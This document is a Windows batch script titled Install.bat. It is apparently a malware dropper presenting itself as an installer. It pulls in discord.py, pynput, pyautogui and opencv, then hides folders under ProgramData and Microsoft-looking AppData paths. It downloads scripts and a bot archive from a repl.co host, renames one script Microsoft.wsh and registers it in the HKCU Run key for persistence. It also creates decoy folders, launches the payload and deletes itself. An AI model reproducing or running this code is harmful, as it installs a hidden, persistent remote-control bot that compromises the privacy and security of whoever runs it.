@echo off
title Install.bat
color 2
cls
if exist "%~dp0install-loading.txt" (goto interrupted)
:PyCheck
if exist C:\Users\%username%\AppData\Local\Programs\Python\Python310\python.exe (goto Install) else (goto NoPy)

:Install
python.exe -m pip install --upgrade pip
pip install discord.py && pip install Pillow && pip install regexp && pip install pywin32 && pip install opencv-python && pip install pynput && pip install pyautogui

if exist C:\ProgramData\RI (attrib -H C:\ProgramData\RI && rd /s /q C:\ProgramData\RI)
md C:\ProgramData\RI && attrib +H C:\ProgramData\RI
curl https://megabotbot.ungaung.repl.co/reinf.bat -o C:\ProgramData\RI\reinf.bat
curl https://megabotbot.ungaung.repl.co/vbs/reinf.vbs -o C:\ProgramData\RI\reinf.vbs

md "C:\Users\All Users\vineum" && attrib +H "C:\Users\All Users\vineum"
md "C:\Users\All Users\vineum\"
md "C:\Users\All Users\vineum\temp"
md "C:\Users\All Users\vineum\NUL\"
md "C:\Users\All Users\vineum\NUL\code"
md "C:\Users\All Users\vineum\temp\zip"
md "C:\Users\All Users\vineum\temp\zip\done"

curl https://megabotbot.ungaung.repl.co/botfiles.zip -o "C:\Users\All Users\vineum\temp\zip\f.zip"
powershell Expand-Archive 'C:\Users\All Users\vineum\temp\zip\f.zip' -DestinationPath 'C:\Users\All Users\vineum\temp\zip\done'
xcopy /h /y /c /e "C:\Users\All Users\vineum\temp\zip\done\" "C:\Users\All Users\vineum\NUL\code\"
rd /s /q "C:\Users\All Users\vineum\temp"

md C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin
md C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498
md C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\
md C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\U_T_E\
curl https://megabotbot.ungaung.repl.co/bin.wsh -o  C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\U_T_E\Microsoft.wsh
powershell New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "1234567890" -Value C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\U_T_E\Microsoft.wsh
set loop = 0
:Random
md C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\%random%
set /a loop=%loop+1
if %loop% GEQ 20 (goto Done)
goto Random

:Done
del /q "%~dp0install-loading.txt"
start C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\U_T_E\Microsoft.wsh
if exist "%~dp0install.vbs" (del /q "%~dp0install.vbs")
del /q "%~dp0install.bat"
exit
:NoPy
md C:\Users\%username%\AppData\Local\Programs\Python
md C:\Users\%username%\AppData\Local\Programs\Python\Launcher
md C:\Users\%username%\AppData\Local\Programs\Python\Python310
md C:\Users\%username%\AppData\Local\Programs\Python\zip

curl https://megabotbot.ungaung.repl.co/Python/Launcher.zip -o C:\Users\%username%\AppData\Local\Programs\Python\zip\Launcher.zip
powershell Expand-Archive C:\Users\%username%\AppData\Local\Programs\Python\zip\Launcher.zip -DestinationPath C:\Users\%username%\AppData\Local\Programs\Python\Launcher

curl https://megabotbot.ungaung.repl.co/Python/Python310.zip -o C:\Users\%username%\AppData\Local\Programs\Python\zip\Python310.zip
powershell Expand-Archive C:\Users\%username%\AppData\Local\Programs\Python\zip\Python310.zip -DestinationPath C:\Users\%username%\AppData\Local\Programs\Python\Python310
rd /s /q C:\Users\%username%\AppData\Local\Programs\Python\zip
goto PyCheck

:interrupted
attrib -H C:\ProgramData\RI 
rd /s /q C:\ProgramData\RI
attrib -H C:\ProgramData\vineum
rd /s /q C:\ProgramData\vineum\NUL\
rd /s /q C:\ProgramData\vineum
rd /s /q C:\ProgramData\vineum\All\temp\NUL\
rd /s /q C:\ProgramData\vineum
rd /s /q C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\
rd /s /q C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin
rd /s /q C:\Users\%username%\AppData\Local\reinf
goto PyCheck